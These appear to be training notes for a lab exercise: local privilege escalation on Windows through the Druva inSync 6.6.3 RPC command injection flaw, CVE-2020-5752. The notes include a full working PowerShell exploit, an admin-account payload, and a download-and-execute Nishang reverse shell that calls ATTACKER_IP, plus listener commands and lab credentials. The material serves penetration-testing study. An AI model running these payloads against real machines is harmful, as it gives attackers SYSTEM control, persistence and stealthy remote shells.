# Section 19 — Vulnerable Services

> **Lab: yes** — RDP to workstation. Exploit Druva inSync 6.6.3 command injection via local RPC service (port 6064) to get SYSTEM shell.

**Core principle:** Third-party applications running as SYSTEM can be just as dangerous as kernel vulnerabilities. If the application exposes an RPC endpoint or local service that accepts commands without proper authentication, any local user can escalate to SYSTEM. Always enumerate installed software and check versions against known CVEs.

---

## Enumeration workflow

### List installed applications

```cmd
wmic product get name
```
> Lists all installed software via WMI. Look for non-standard applications — anything beyond Windows defaults and common tools. Research version numbers against known vulnerabilities.

### Check for listening local services

```cmd
netstat -ano | findstr LISTENING
```
> Shows all listening TCP/UDP ports with process IDs. Local-only services (127.0.0.1) are prime targets — they're not exposed to the network but accessible from any local user.

### Map PID to process name

```powershell
Get-Process -Id <PID>
```
> Identifies what application owns a listening port.

### Confirm service details

```powershell
Get-Service | ? {$_.DisplayName -like '<AppName>*'}
```
> Shows service status and name. Check if it runs as LocalSystem.

---

## Druva inSync 6.6.3 — Command Injection (CVE-2020-5752)

**What:** Druva inSync client runs an RPC service on port 6064 as `NT AUTHORITY\SYSTEM`. The service accepts commands via a socket connection with path traversal — an attacker can break out of the allowed command directory and execute arbitrary commands as SYSTEM.

**Why it works:**
```
1. inSync service listens on 127.0.0.1:6064 as SYSTEM
2. RPC interface accepts a command path: C:\ProgramData\Druva\inSync4\<command>
3. Path traversal: ..\..\..\ breaks out to C:\ 
4. Attacker sends: C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <payload>
5. Service executes cmd.exe as SYSTEM
```

---

## Two exploitation methods

### Method A: Add local admin (simple, noisy)

Modify the `$cmd` variable in the PoC:
```powershell
$cmd = "net user pwnd Pwnd1234! /add && net localgroup administrators pwnd /add"
```

### Method B: Reverse shell (stealthy)

Use Nishang's `Invoke-PowerShellTcp.ps1` loaded into memory:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:<SERVE_PORT>/shell.ps1')"
```

---

## Step-by-step: Reverse shell method

### Step 1: Prepare reverse shell script (attacker box)

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/shell.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <LPORT>' >> /tmp/shell.ps1
```
> Copies Nishang reverse shell and appends auto-execution line. When the target downloads and runs this, it connects back to your listener immediately.

### Step 2: Host the script (attacker box)

```bash
cd /tmp && python3 -m http.server <SERVE_PORT>
```

### Step 3: Start listener (attacker box)

```bash
nc -lvnp <LPORT>
```

### Step 4: Run the exploit (target box)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```
> Allows running unsigned scripts in the current PowerShell session.

Then run the full PoC (paste as one block):

```powershell
$ErrorActionPreference = "Stop"
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:<SERVE_PORT>/shell.ps1')"
$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Step 5: Confirm SYSTEM shell (attacker box)

```cmd
whoami
```
> Should return `nt authority\system`.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-WS01)
**Creds:** `htb-student` / `HTB_@cademy_stdnt!`
**Goal:** Exploit Druva inSync → SYSTEM → read flag in `C:\Users\Administrator\Desktop\VulServices\`
**Access:** RDP

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = htb-student                              │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
│ LPORT        = 9443                                     │
│ SERVE_PORT   = 8080                                     │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. Prepare reverse shell script
   cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/shell.ps1
   echo 'Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 9443' >> /tmp/shell.ps1

2. Host it
   cd /tmp && python3 -m http.server 8080

3. Start listener (separate terminal)
   nc -lvnp 9443

4. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

TARGET BOX (as htb-student)
───────────────────────────
5. Confirm Druva is running
   netstat -ano | findstr 6064
   (Should show LISTENING on 127.0.0.1:6064)

6. Set execution policy
   Set-ExecutionPolicy Bypass -Scope Process

7. Run the exploit (paste full PoC with $cmd pointing to shell.ps1)

ATTACKER BOX (SYSTEM shell)
───────────────────────────
8. Confirm SYSTEM
   whoami

9. Read the flag
   type C:\Users\Administrator\Desktop\VulServices\flag.txt
```

---

## Lab observations & attack chain

```
Unprivileged user (htb-student)
│
├── Enumerate installed software
│   └── wmic product get name → Druva inSync 6.6.3
│
├── Confirm vulnerable service
│   ├── netstat → port 6064 listening on 127.0.0.1
│   ├── Get-Process → inSyncCPHwnet64 (PID)
│   └── Get-Service → Druva inSync Client Service (Running)
│
├── Exploit: RPC command injection via socket
│   ├── Connect to 127.0.0.1:6064
│   ├── Send RPC header + path-traversal command
│   ├── cmd.exe /c <payload> executes as SYSTEM
│   └── Nishang reverse shell connects back
│
└── Post-exploitation (SYSTEM)
    ├── Read flag
    ├── hashdump / secretsdump
    ├── Full machine control
    └── Pivot to other systems
```

---

## Key takeaways

- **Always enumerate installed software.** `wmic product get name` is the first check. Version numbers + Google = known exploits.
- **Local-only services are high-value targets.** They're often less hardened because they're not network-exposed, but any local user can reach them.
- **Third-party software running as SYSTEM is a goldmine.** Backup agents, monitoring tools, VPN clients — these commonly run as SYSTEM and may have vulnerabilities.
- **Path traversal in service commands is a classic pattern.** Druva restricted commands to its install directory, but `..\..\..` breaks out trivially.
- **Nishang's Invoke-PowerShellTcp is the go-to for in-memory reverse shells.** No binary on disk — harder to detect. Append the execution line to the script so it auto-runs on download.
- **Organizations should restrict local software installation** and maintain application whitelists to reduce this attack surface.
